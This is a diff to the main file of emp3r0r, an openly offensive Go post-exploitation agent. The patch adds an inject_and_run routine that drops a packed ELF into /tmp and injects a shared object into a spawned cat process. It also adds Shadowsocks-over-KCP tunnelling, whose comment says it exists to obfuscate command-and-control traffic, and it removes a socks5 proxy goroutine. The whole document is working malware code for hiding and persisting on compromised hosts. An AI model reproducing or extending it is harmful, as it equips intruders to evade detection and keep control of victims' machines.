@@ -37,6 +37,12 @@ func main() {
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
 
+	// inject
+	err = inject_and_run()
+	if err != nil {
+		log.Print(err)
+	}
+
 	// applyRuntimeConfig
 	err = agent.ApplyRuntimeConfig()
 	if err != nil {
@@ -89,7 +95,7 @@ func main() {
 	// PATH
 	os.Setenv("PATH", fmt.Sprintf("%s:/bin:/usr/bin:/usr/local/bin", agent.RuntimeConfig.UtilsPath))
 
-	// HOME
+	// set HOME to correct value
 	u, err := user.Current()
 	if err != nil {
 		log.Printf("Get user info: %v", err)
@@ -232,22 +238,6 @@ test_agent:
 		}
 	}
 
-	// socks5 proxy
-	go func() {
-		// start a socks5 proxy
-		err := agent.Socks5Proxy("on", "0.0.0.0:"+agent.RuntimeConfig.ProxyPort)
-		if err != nil {
-			log.Printf("Socks5Proxy on %s: %v", agent.RuntimeConfig.ProxyPort, err)
-			return
-		}
-		defer func() {
-			err := agent.Socks5Proxy("off", "0.0.0.0:"+agent.RuntimeConfig.ProxyPort)
-			if err != nil {
-				log.Printf("Socks5Proxy off (%s): %v", agent.RuntimeConfig.ProxyPort, err)
-			}
-		}()
-	}()
-
 	// do we have internet?
 	checkInternet := func(cnt *int) bool {
 		if tun.HasInternetAccess() {
@@ -255,7 +245,23 @@ test_agent:
 			if *cnt == 0 {
 				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 				ctx, cancel := context.WithCancel(context.Background())
-				go agent.StartBroadcast(true, ctx, cancel)
+				go agent.StartBroadcast(true, ctx, cancel) // auto-proxy feature
+
+				if agent.RuntimeConfig.UseShadowsocks {
+					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
+					agent.RuntimeConfig.AgentProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
+						agent.RuntimeConfig.ShadowsocksPort)
+					emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s)", agent.RuntimeConfig.ShadowsocksPort)
+
+					// ss thru KCP, set C2 transport
+					if agent.RuntimeConfig.UseKCP {
+						emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s)",
+							agent.RuntimeConfig.ShadowsocksPort, agent.RuntimeConfig.KCPPort)
+					}
+
+					// run ss w/wo KCP
+					go agent.ShadowsocksC2Client()
+				}
 			}
 			return true
 
@@ -389,4 +395,41 @@ func server(c net.Conn) {
 			log.Printf("Write: %v", err)
 		}
 	}
+}
+
+func inject_and_run() (err error) {
+	// inject self to a cat process
+	// check path hash to make sure we don't get trapped in a dead loop
+	path_hash := tun.SHA256Sum(fmt.Sprintf("emp3r0r_salt:%s", os.Getenv("PATH")))
+	if path_hash == "f74980d53e01a9ca2078f3894390606d4ecc1b0fc70d284faa16043d718ad0a5" {
+		return fmt.Errorf("This process is started by injector, aborting")
+	}
+
+	// read envv
+	fd := os.Getenv("FD")
+	if fd == "" {
+		return fmt.Errorf("FD empty")
+	}
+	packed_elf_data, err := ioutil.ReadFile(fd)
+	if err != nil {
+		return fmt.Errorf("read %s: %v", fd, err)
+	} else {
+		cmd := exec.Command("/bin/cat")
+		err = cmd.Run()
+		if err != nil {
+			return
+		}
+		go func(e error) {
+			for cmd.Process != nil {
+				e = ioutil.WriteFile("/tmp/emp3r0r", packed_elf_data, 0755)
+				if e != nil {
+					break
+				}
+				e = agent.InjectSO(cmd.Process.Pid)
+				break
+			}
+		}(err)
+	}
+
+	return
 }
